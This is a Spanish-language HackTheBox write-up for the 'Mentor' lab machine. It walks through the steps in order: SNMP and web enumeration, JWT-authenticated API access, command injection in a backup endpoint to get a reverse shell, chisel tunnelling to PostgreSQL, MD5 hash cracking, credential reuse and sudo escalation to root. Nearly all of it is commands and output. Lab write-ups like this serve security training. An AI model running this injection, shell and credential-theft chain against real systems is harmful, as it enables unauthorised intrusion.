@@ -1,0 +1,306 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Mentor HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/mentor.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Mentor HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Mentor de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Mentor de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Mentor HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Mentor HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Mentor de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Mentor HackTheBox</h1>
+          <p>Resolución de la máquina Mentor de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.193
+Nmap scan report for 10.10.11.193
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Además del escaneo tcp haremos uno udp con los 100 puertos mas comunes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo nmap </span><span class="p">-T5 --top-ports 100 -sU --open 10.10.11.193
+Nmap scan report for 10.10.11.193
+PORT    STATE SERVICE
+161/udp open  snmp</span>
+</code></pre></div></div>
+
+<div><p>Con snmpbulkwalk listamos los recursos en busca de una autenticación como login</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ snmpbulkwalk</span><span class="p"> -v2c -c internal 10.10.11.193 | grep login
+iso.3.6.1.2.1.25.4.2.1.2.913 = STRING: "systemd-logind"
+iso.3.6.1.2.1.25.4.2.1.2.1690 = STRING: "login.sh"
+iso.3.6.1.2.1.25.4.2.1.2.2111 = STRING: "login.py"
+iso.3.6.1.2.1.25.4.2.1.4.913 = STRING: "/lib/systemd/systemd-logind"
+iso.3.6.1.2.1.25.4.2.1.5.1690 = STRING: "/usr/local/bin/login.sh"
+iso.3.6.1.2.1.25.4.2.1.5.2111 = STRING: "/usr/local/bin/login.py </span><span class="kd">kj23sadkj123as0-d213"</span>
+</code></pre></div></div>
+
+<div><p>Encontramos una contraseña pero por ahora no nos sirve de mucho</p></div>
+<div><p>Al mirar las cabeceras de respuesta al hacer un curl podemos ver el dominio mentorquotes.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.193 -I | </span><span class="s2">grep</span><span class="p"> Location
+Location: </span><span class="kd">http://mentorquotes.htb/</span>
+</code></pre></div></div>
+
+<div><p>Con el dominio en el /etc/hosts podemos seguir buscando subdominios con gobuster</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">vhost -u mentorquotes.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -r
+===============================================================
+[+] Url:          http://mentorquotes.htb
+[+] Threads:      100
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: </span><span class="kd">api.mentorquotes.htb</span><span class="p"> (Status: 404) [Size: 22]</span>
+</code></pre></div></div>
+
+<div><p>Ahora con gobuster buscaremos directorios sobre la api, y podemos ver /docs</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -u api.mentorquotes.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Url:                     http://api.mentorquotes.htb
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/]
+</span><span class="kd">/docs</span><span class="p">                 (Status: 200) [Size: 969]                                       
+/users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/]
+/quotes               (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/quotes/]</span>
+</code></pre></div></div>
+
+<div><p>Encontramos una funcion de enviar mail, donde al pasar el cursor nos lekea el mail de james</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Hay un apartado para loguearnos podemos darle en try it out</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Usamos el correo encontrado y la contraseña en snmp con el usuario jack, ahora damos execute</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Capturamos con burpsuite, lo enviamos al repeater y damos clic a send</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>En la respuesta encontraremos que nos devuelve un token con el que nos autenticaremos</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Ahora haremos una petición GET hacia /admin con el token como Authorization</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>En la respuesta nos muestra 2 rutas, /check y /backup que es la que usaremos</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Agregamos la ruta /backup y cambiamos la petición a POST</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>En la respuesta podemos ver que necesitamos enviarle data en json</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div><p>Agregamos la cabecera Content-Type: application/json y enviamos como data solo {}</p></div>
+<div><p><img src="./10.png"><p></div>
+
+<div><p>En la respuesta encontramos los dos argumentos: body y path</p></div>
+<div><p><img src="./11.png"><p></div>
+
+<div><p>Enviamos ambos campos con cualquier cosa en este caso "gato" como argumento</p></div>
+<div><p><img src="./12.png"><p></div>
+
+<div><p>En la respuesta podemos ver el campo INFO con un Done! como argumento/p></div>
+<div><p><img src="./13.png"><p></div>
+
+<div><p>En el campo path podemos intentar adjuntar un comando con ; asi que nos enviamos una revshell</p></div>
+<div><p><img src="./14.png"><p></div>
+
+<div><p>Al darle a send, recibimos una shell como root en un contenedor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.193
+/app # whoami
+root
+/app # ifconfig | grep "inet "    
+          inet addr:172.22.0.3  Bcast:172.22.255.255  Mask:255.255.0.0
+          inet addr:127.0.0.1  Mask:255.0.0.0
+/app #</span>
+</code></pre></div></div>
+
+<div><p>En la ruta /app/app encontramos un db.py donde encontramos credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">/app/app # cat db.py | grep :
+DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
+/app/app #</span>
+</code></pre></div></div>
+
+<div><p>Ahora ejecutmos chisel como servidor para alcanzar el puerto de postgresql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ chisel </span><span class="p">server --reverse --port 4444
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:4444</span>
+</code></pre></div></div>
+
+<div><p>Desde el contenedor nos enviamos el puerto 5432 de la maquina real a nuestro equipo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">/app/app # ./chisel client 10.10.14.10:4444 R:5432:172.22.0.1:5432
+client: Connecting to ws://10.10.14.10:4444
+client: Connected (Latency 9.3701ms)</span>
+</code></pre></div></div>
+
+<div><p>Ahora desde nuestro equipo nos podemos conectar con psql para enumerar la db</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ psql </span><span class="p">-h localhost -U postgres -d mentorquotes_db
+Contraseña para usuario postgres: </span><span class="kd">postgres</span><span class="p">
+psql (13.9 (Debian 13.9-0+deb11u1), servidor 13.7 (Debian 13.7-1.pgdg110+1))
+Digite «help» para obtener ayuda.
+
+</span><span class="kd">mentorquotes_db=#</span>
+</code></pre></div></div>
+
+
+<div><p>Enumerando las tablas nos encontramos con la tabla users</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">mentorquotes_db=#</span><span class="p"> \d
+             Listado de relaciones
+ Esquema |    Nombre     |   Tipo    |  Dueño   
+---------+---------------+-----------+----------
+ public  | cmd_exec      | tabla     | postgres
+ public  | quotes        | tabla     | postgres
+ public  | quotes_id_seq | secuencia | postgres
+ public  | users         | tabla     | postgres
+ public  | users_id_seq  | secuencia | postgres
+(5 filas)
+
+</span><span class="kd">mentorquotes_db=#</span>
+</code></pre></div></div>
+
+<div><p>Leyendo la tablas users encontramos un par de usuarios y hashes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">mentorquotes_db=#</span><span class="p"> select * from users;
+ id |         email          |  username   |             password             
+----+------------------------+-------------+----------------------------------
+  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
+  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
+(2 filas)
+
+</span><span class="kd">mentorquotes_db=#</span>
+</code></pre></div></div>
+
+<div><p>Guardamos los hashes y con ayuda de john encontramos una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hashes
+james:7ccdcd8c05b59add9c198d492b36a503
+service_acc:53f22d0dfa10dce7e29cd31f4f953fd8
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-MD5
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 XOP 4x2])
+</span><span class="kd">123meunomeeivani </span><span class="p">(</span><span class="na">service_acc</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Con la contraseña nos podemos conectar por ssh y finalmente leer la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">svc@10.10.11.193
+svc@10.10.11.193's password: 123meunomeeivani
+</span><span class="s2">svc@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(svc) gid=1001(svc) groups=1001(svc)
+</span><span class="s2">svc@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+554*************************92c
+</span><span class="s2">svc@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutar <a href="">linpeas</a> podemos encontrar un apartado de archivos de snmp que sabemos está activo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">╔══════════╣ </span><span class="s2">Analyzing SNMP Files </span><span class="p">(limit 70)
+-rw-r--r-- 1 root root 3453 Jun  5  2022 </span><span class="kd">/etc/snmp/snmpd.conf</span><span class="p">
+# rocommunity: a SNMPv1/SNMPv2c read-only access community name
+rocommunity  public default -V systemonly
+rocommunity6 public default -V systemonly
+-rw------- 1 Debian-snmp Debian-snmp 1268 Dec 19 04:10 /var/lib/snmp/snmpd.conf</span>
+</code></pre></div></div>
+
+<div><p>En el archivo de configuración podemos encontrar una contraseña en texto plano</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">svc@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/snmp/snmpd.conf | grep -i password
+createUser bootstrap MD5 SuperSecurePassword123__ DES
+</span><span class="s2">svc@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos reutilizarla con otro usuario que podemos ver en el /etc/passwd</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">svc@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+svc:x:1001:1001:,,,:/home/svc:/bin/bash
+</span><span class="kd">james</span><span class="p">:x:1000:1000:,,,:/home/james:/bin/bash
+</span><span class="s2">svc@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos conectamos por ssh como james con la contraseña del archivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sshpass </span><span class="p">-p</span><span class="no"> "SuperSecurePassword123__" </span><span class="p">ssh james@10.10.11.193
+</span><span class="s2">james@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(james) gid=1000(james) groups=1000(james)
+</span><span class="s2">james@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando privilegios de sudoers podemos ver que podemos ejecutar sh como cualquier usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">james@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for james: SuperSecurePassword123__
+Matching Defaults entries for james on mentor:
+    secure_path=/usr/local/bin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on mentor:
+    (</span><span class="na">ALL</span><span class="p">) </span><span class="kd">/bin/sh</span><span class="p">
+</span><span class="s2">james@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Esto es facil, simplemente ejecutamos la shell como root y leemos la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">james@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo sh -c bash
+</span><span class="s2">root@mentor</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@mentor</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+e11*************************430
+</span><span class="s2">root@mentor</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
